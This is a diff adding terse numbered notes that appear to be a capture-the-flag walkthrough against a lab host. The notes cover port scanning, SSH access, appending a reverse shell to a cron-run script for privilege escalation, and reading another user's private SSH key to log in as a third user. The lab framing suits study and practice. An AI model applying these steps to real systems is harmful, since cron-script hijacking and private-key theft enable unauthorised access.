@@ -1,0 +1,13 @@
+1 - nmap -A 10.10.101.62
+2 - ssh -p TRY_ALL_PORTS 10.10.101.62 (Vigenere Decode)
+3 - ssh jabberwock@10.10.101.62
+4 - cat twasBrillig.sh
+5 - cat /etc/crontab
+6 - sudo -l -l
+7 - echo 'bash tcp reverse shell' >> twasBrillig.sh
+8 - cat humptydumpty.txt
+9 - su humptydumpty
+10 - cat /home/humptydumpty/.ssh/id_rsa
+11 - chmod 600 id_rsa
+12 - ssh -i id_rsa alice@10.10.101.62
+13 - 
